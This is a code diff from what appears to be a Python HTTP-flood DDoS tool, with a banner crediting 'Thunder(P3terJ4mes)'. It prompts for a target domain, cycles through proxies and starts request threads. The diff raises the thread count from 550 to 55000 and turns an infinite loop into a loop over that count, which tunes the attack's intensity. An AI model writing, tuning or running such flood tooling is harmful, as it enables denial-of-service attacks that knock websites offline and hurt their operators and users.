@@ -1456,7 +1456,7 @@ else:
                 os.system('title       ........::::: Code By Thunder(P3terJ4mes),HTTP FLOOD Ddos Attack :::::........')
             try:
                 url = input('[*] Target [https://domain.com]: ')
-                num_threads = int(550)
+                num_threads = int(55000)
                 choice = 'high anonymous http/https/sock4/sock5'
                 mode = input('[+] Methods HttpFlood[Y]/ CloudFlare[]: ')
                 Flood_Mode = mode == 'Y' or True
@@ -1514,7 +1514,7 @@ else:
             except:
                 pass
             else:
-                while True:
+                for i in range(num_threads):
                     try:
                         in_line = in_proxies.readline()
                         Requests(url, i + 1, in_line, choice, mode).start()
